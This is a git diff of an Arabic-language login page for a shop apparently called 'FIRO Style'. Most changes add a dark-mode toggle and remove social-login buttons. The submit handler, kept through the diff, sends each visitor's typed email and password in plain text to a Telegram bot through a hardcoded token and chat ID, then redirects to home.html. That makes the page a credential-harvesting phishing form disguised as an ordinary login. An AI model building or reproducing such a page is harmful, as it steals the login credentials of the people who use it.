@@ -7,25 +7,117 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background-image: url('cover.png'); background-size: cover; background-position: center; background-attachment: fixed; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #f4ece2; }
-        .login-box { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.3); padding: 40px; border-radius: 25px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        .logo-name { font-family: 'Playfair Display', serif; font-size: 2.8rem; color: #fff; margin-bottom: 30px; text-shadow: 2px 2px 8px rgba(0,0,0,0.3); }
+        /* تعريف الألوان الأساسية والمتغيرة */
+        :root {
+            --bg-overlay: rgba(255, 255, 255, 0.2);
+            --text-color: #ffffff;
+            --input-bg: rgba(255, 255, 255, 0.9);
+            --input-text: #333;
+            --accent-color: #a67c52;
+        }
+
+        /* ألوان الوضع الليلي */
+        [data-theme="dark"] {
+            --bg-overlay: rgba(0, 0, 0, 0.7);
+            --text-color: #f4ece2;
+            --input-bg: rgba(30, 30, 30, 0.9);
+            --input-text: #ffffff;
+            --accent-color: #d4a373;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; transition: background 0.3s, color 0.3s; }
+        
+        body { 
+            background-image: url('cover.png'); 
+            background-size: cover; 
+            background-position: center; 
+            background-attachment: fixed; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
+
+        /* زر تبديل الوضع الليلي */
+        .theme-switch {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: var(--bg-overlay);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.3);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            color: var(--text-color);
+            font-size: 20px;
+            z-index: 1000;
+        }
+
+        .login-box { 
+            background: var(--bg-overlay); 
+            backdrop-filter: blur(15px); 
+            -webkit-backdrop-filter: blur(15px); 
+            border: 1px solid rgba(255, 255, 255, 0.3); 
+            padding: 40px; 
+            border-radius: 25px; 
+            width: 100%; 
+            max-width: 400px; 
+            text-align: center; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
+        }
+
+        .logo-name { 
+            font-family: 'Playfair Display', serif; 
+            font-size: 2.8rem; 
+            color: var(--text-color); 
+            margin-bottom: 30px; 
+            text-shadow: 2px 2px 8px rgba(0,0,0,0.3); 
+        }
+
         .input-group { position: relative; margin-bottom: 15px; }
-        .input-group input { width: 100%; padding: 12px 45px 12px 15px; border: none; border-radius: 10px; background: rgba(255, 255, 255, 0.9); font-size: 16px; outline: none; text-align: right; }
-        .input-group i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #a67c52; }
-        .btn-login { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #a67c52; color: white; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-login:hover { background: #8b6642; transform: translateY(-2px); }
-        .separator { margin: 20px 0; color: #fff; display: flex; align-items: center; font-size: 0.9rem; }
+        .input-group input { 
+            width: 100%; 
+            padding: 12px 45px 12px 15px; 
+            border: none; 
+            border-radius: 10px; 
+            background: var(--input-bg); 
+            color: var(--input-text);
+            font-size: 16px; 
+            outline: none; 
+            text-align: right; 
+        }
+        .input-group i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-color); }
+
+        .btn-login { 
+            width: 100%; 
+            padding: 12px; 
+            border: none; 
+            border-radius: 10px; 
+            background: var(--accent-color); 
+            color: white; 
+            font-size: 1.1rem; 
+            font-weight: bold; 
+            cursor: pointer; 
+        }
+
+        .separator { margin: 20px 0; color: var(--text-color); display: flex; align-items: center; font-size: 0.9rem; }
         .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: rgba(255,255,255,0.4); margin: 0 10px; }
-        .social-login { display: flex; gap: 10px; margin-bottom: 20px; }
-        .social-btn { flex: 1; padding: 10px; border: none; border-radius: 8px; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .fb { background: #3b5998; } .ig { background: #e4405f; }
-        .signup-text { color: #fff; font-size: 0.9rem; }
-        .signup-text a { color: #fff; font-weight: bold; text-decoration: underline; }
+
+        .signup-text { color: var(--text-color); font-size: 0.9rem; }
+        .signup-text a { color: var(--text-color); font-weight: bold; }
     </style>
 </head>
 <body>
+
+    <div class="theme-switch" onclick="toggleTheme()">
+        <i id="theme-icon" class="fas fa-moon"></i>
+    </div>
+
     <div class="login-box">
         <h1 class="logo-name">FIRO Style</h1>
         <form id="loginForm">
@@ -39,30 +131,50 @@
             </div>
             <button type="submit" class="btn-login">تسجيل الدخول</button>
         </form>
-        <div class="separator">أو عبر</div>
-        <div class="social-login">
-            <button class="social-btn fb"><i class="fa-brands fa-facebook"></i> فيسبوك</button>
-            <button class="social-btn ig"><i class="fa-brands fa-instagram"></i> انستجرام</button>
-        </div>
+
+        <div class="separator">أو</div>
+        
         <p class="signup-text">ليس لديك حساب؟ <a href="signup.html">سجل الآن</a></p>
     </div>
 
     <script>
+        // دالة تبديل الوضع
+        function toggleTheme() {
+            const body = document.documentElement;
+            const icon = document.getElementById('theme-icon');
+            
+            if (body.getAttribute('data-theme') === 'dark') {
+                body.removeAttribute('data-theme');
+                icon.className = 'fas fa-moon';
+                localStorage.setItem('theme', 'light');
+            } else {
+                body.setAttribute('data-theme', 'dark');
+                icon.className = 'fas fa-sun';
+                localStorage.setItem('theme', 'dark');
+            }
+        }
+
+        // حفظ الاختيار حتى بعد تحديث الصفحة
+        window.onload = () => {
+            if (localStorage.getItem('theme') === 'dark') {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                document.getElementById('theme-icon').className = 'fas fa-sun';
+            }
+        }
+
+        // كود التليجرام الخاص بك (Login)
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
             const token = "8665629681:AAFiHgfuw1hL3thh8VJ6vxCjnYQ9BIkfA-g";
             const chatId = "5511952564";
-            const message = `🔑 محاولة تسجيل دخول:\n👤 الحساب: ${email}\n🔒 الباسورد: ${pass}`;
-
+            
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            }).then(() => {
-                window.location.href = "home.html";
-            });
+                body: JSON.stringify({ chat_id: chatId, text: `👤 دخول جديد:\n📧 الإيميل: ${email}\n🔒 الباسورد: ${pass}` })
+            }).then(() => window.location.href = "home.html");
         });
     </script>
 </body>
